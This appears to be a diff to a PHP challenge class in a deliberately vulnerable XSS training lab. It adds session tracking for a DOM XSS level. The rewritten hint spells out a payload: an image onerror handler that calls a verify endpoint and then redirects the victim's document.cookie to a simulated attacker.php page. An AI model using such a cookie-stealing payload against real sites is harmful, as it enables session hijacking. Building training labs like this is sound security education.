@@ -9,14 +9,23 @@
  * The vulnerability exists entirely in the client-side JavaScript.
  */
 
-namespace App\Labs\XSS\Challenges;
+namespace Labs\XSS\Challenges;
 
 use App\Core\ChallengeInterface;
-use App\Core\Database;
+use App\Core\BaseChallenge;
+use App\Core\Session;
 
-class Level3Dom implements ChallengeInterface
+class Level3Dom extends BaseChallenge implements ChallengeInterface
 {
     private $completed = false;
+
+    public function __construct()
+    {
+        // Check if already solved via session
+        if (Session::get('xss_lvl3_solved') === true) {
+            $this->completed = true;
+        }
+    }
 
     public function render(): string
     {
@@ -30,9 +39,11 @@ class Level3Dom implements ChallengeInterface
     {
         $response = ['success' => false, 'message' => ''];
 
-        // Handle verification action (called by the payload via AJAX)
+        // Handle verification action (called by the payload via AJAX or direct access)
         if (isset($data['action']) && $data['action'] === 'verify') {
             $this->markCompleted();
+            Session::set('xss_lvl3_solved', true);
+            $this->completed = true;
             $response['success'] = true;
             $response['message'] = 'Payload executed successfully. Challenge complete.';
         }
@@ -42,14 +53,18 @@ class Level3Dom implements ChallengeInterface
 
     public function validate(array $data): bool
     {
-        // For DOM XSS, validation happens client-side when the payload executes
-        // We just check if the verification action was called
+        // For DOM XSS, validation happens when verify action is called
+        // Also check session flag set by attacker.php redirect
+        if (Session::get('xss_lvl3_solved') === true) {
+            return true;
+        }
+        
         return isset($data['action']) && $data['action'] === 'verify';
     }
 
     public function getHint(): string
     {
-        return "DOM XSS occurs when user input from the URL (like #hash) is written directly to the page without sanitization. Try injecting an image tag with an onerror handler that calls the verification endpoint.";
+        return "DOM XSS occurs when user input from the URL (like #hash) is written directly to the page without sanitization. Try injecting an image tag with an onerror handler that calls fetch('challenge.php?page=lvl3&action=verify') and then redirects to /public/attacker.php?level=3&cookie='+document.cookie";
     }
 
     public function getTitle(): string
